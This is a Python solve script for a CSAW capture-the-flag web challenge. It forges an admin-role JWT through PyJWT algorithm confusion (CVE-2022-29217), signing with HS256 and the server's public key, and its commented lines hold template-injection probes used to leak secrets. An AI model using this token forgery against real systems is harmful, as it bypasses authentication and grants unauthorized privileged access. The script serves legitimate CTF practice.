import datetime
import jwt
import requests


# Turns out the keys they give are different from the server keys and they just didn't tell us, had to check Discord
# with open('public/private_key.pem', 'rb') as f:
#     PRIVATE_KEY = f.read()
#
# with open('public/public_key.pub', 'rb') as f:
#     PUBLICKEY = f.read()

def main():
    # print(requests.post("https://lost-pyramid.ctf.csaw.io/scarab_room", data={"name": "{{KINGSDAY}}"}).text)
    # print(requests.post("https://lost-pyramid.ctf.csaw.io/scarab_room", data={"name": "{{PUBLICKEY}}"}).text)
    public_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2"
    payload = {
        "ROLE": "royalty",
        "CURRENT_DATE": "03_07_1341_BC",
        "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000))
    }

    # Requires PyJWT 2.3.0 or earlier to run
    # https://www.vicarius.io/vsociety/posts/risky-algorithms-algorithm-confusion-in-pyjwt-cve-2022-29217
    token = jwt.encode(payload, public_key, algorithm="HS256")

    req = requests.get("https://lost-pyramid.ctf.csaw.io/kings_lair", cookies={"pyramid": token})
    print(req.text)


if __name__ == '__main__':
    main()
